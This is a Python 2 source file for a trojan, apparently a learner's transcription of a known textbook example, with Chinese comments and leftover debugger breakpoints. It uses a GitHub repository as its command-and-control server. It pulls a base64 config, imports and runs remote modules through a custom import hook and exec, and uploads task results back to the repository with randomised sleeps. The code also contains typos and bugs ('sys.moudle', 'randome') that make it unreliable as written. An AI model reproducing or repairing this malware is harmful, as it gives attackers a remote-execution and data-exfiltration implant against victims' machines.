# !/usr/bin/Python
# -*- coding:utf-8 -*-

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
from github3 import login
import pdb

trojan_id = "LEETME"

trojan_config = "%s.json" % trojan_id
trojan_path = "data/%s/" % trojan_id
trojan_module = []
# 定义username与password
user_name = ''
pass_word = ''

configured = False
task_queue = Queue.Queue()

pdb.set_trace()


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        pdb.set_trace()
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_content("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.moudle[name] = module
        return module



# 连接到github，并获取结果
def connect_to_github():
    res = login(username=user_name, password=pass_word)
    pdb.set_trace()
    repo = res.repository("changgongliu","leetme")
    branch = repo.branch("master")

    return res, repo, branch

#获取文件内容函数
def get_file_content(file_path):
    res, repo, branch = connect_to_github()
    pdb.set_trace()
    tree = branch.commit.commit.tree.recurse()##---------------------
    for filename in tree.tree:
        if file_path in filename.path:
            print "[*] Found file %s" % file_path
            blob = repo.blob(filename._json_data["sha"])

            return blob.content #　此处函数作用--------------------------------
            #return blob #　原来的出错代码
    return None


#从远程获取对应的config文件
def get_trojan_config():
    global configured

    config_json = get_file_content(trojan_config)# 获取json文件中内容
    config = json.loads(base64.b64decode(config_json))#　取代config_json
    configured = True
    pdb.set_trace()
    for task in config:
        if task["module"] not in sys.modules:
            print "[*] %s not in sys.modules" % task["module"]

            exec("import %s" % task["module"])
    return configured


# 将数据保存到github的data目录下
def store_module_result(result):
    res, repo, branch = connect_to_github()   #定义connect_to_github函数，连接到github返回结果res，仓库repo,分支branch
    remote_path = "data/%s/%d.data" % (trojan_id, randome.randint(1000,10000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(result))

    return

#　运行模块
def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result) # 将结果保存到github上
    return

if __name__ == "__main__":
    print "[*] Starting"
    # 木马主循环
    sys.meta_path = [GitImporter()]# 此处函数作用---------------------------------

    while True:
            if task_queue.empty():
                config = get_trojan_config()  # 获取config文件

                for task in config:
                    #t = threading.Thread(target=module_runner,args=(task['module'],))
                    #　以上这句话不知道哪出错了，会报错－－－－－－－－－－－－－－－－－－　
                    t = threading.Thread(target=module_runner,args=(task['module'],))
                    #module运行函数
                    t.start()
                    time.sleep(random.randint(1,10))
            time.sleep(random.randint(1000,10000))
